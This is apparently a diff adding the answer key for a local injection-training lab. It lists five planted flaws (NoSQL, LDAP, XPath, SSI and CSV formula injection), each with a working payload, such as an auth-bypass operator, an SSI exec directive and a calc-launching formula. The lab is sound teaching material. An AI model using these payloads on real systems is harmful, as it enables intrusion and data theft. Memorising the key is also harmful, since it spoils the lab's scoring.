@@ -1,0 +1,37 @@
+{
+  "lab": "09-injectarena",
+  "base_url": "http://127.0.0.1:18809",
+  "stack": "python-stdlib app simulating NoSQL/LDAP/XPath/SSI/CSV backends",
+  "vulns": [
+    {
+      "id": "N1", "class": "nosqli", "severity": "critical", "route": "/login",
+      "desc": "NoSQL injection: POST /login (JSON) monta a query estilo MongoDB com o input do usuário — operadores como {\"$ne\":null} / {\"$gt\":\"\"} no campo password burlam a autenticação.",
+      "exploit": "POST /login {\"username\":\"admin\",\"password\":{\"$ne\":null}} -> autentica como admin sem senha.",
+      "points": 1
+    },
+    {
+      "id": "N2", "class": "ldap-injection", "severity": "high", "route": "/directory",
+      "desc": "LDAP injection: GET /directory?user= é interpolado num filtro LDAP (uid=<user>) sem escapar — payload *)(uid=* retorna todos os objetos / burla auth.",
+      "exploit": "GET /directory?user=*)(uid=*))(|(uid=* -> lista todos os usuários do diretório.",
+      "points": 1
+    },
+    {
+      "id": "N3", "class": "xpath-injection", "severity": "high", "route": "/employee",
+      "desc": "XPath injection: GET /employee?name= é concatenado numa expressão XPath sobre um XML — ' or '1'='1 retorna todos os nós / vaza dados de outros.",
+      "exploit": "GET /employee?name=x' or '1'='1 -> retorna todos os funcionários (incl. salários/segredos).",
+      "points": 1
+    },
+    {
+      "id": "N4", "class": "ssi-injection", "severity": "critical", "route": "/greet",
+      "desc": "Server-Side Includes (SSI) injection: o parâmetro name= é refletido num template processado por SSI — diretivas <!--#exec cmd=\"...\"--> / <!--#include--> executam no servidor (RCE).",
+      "exploit": "GET /greet?name=<!--#exec cmd=\"whoami\"--> -> diretiva SSI processada/executada no servidor.",
+      "points": 1
+    },
+    {
+      "id": "N5", "class": "csv-injection", "severity": "medium", "route": "/export",
+      "desc": "CSV / formula injection: dados controlados pelo usuário (ex.: nome no /feedback) são exportados em CSV em /export sem escapar prefixos perigosos (= + - @) — fórmula executa quando a vítima abre no Excel/Sheets.",
+      "exploit": "Enviar nome '=cmd|\"/c calc\"!A1' (ou =1+1); GET /export -> célula começa com = sem escape (formula injection).",
+      "points": 1
+    }
+  ]
+}
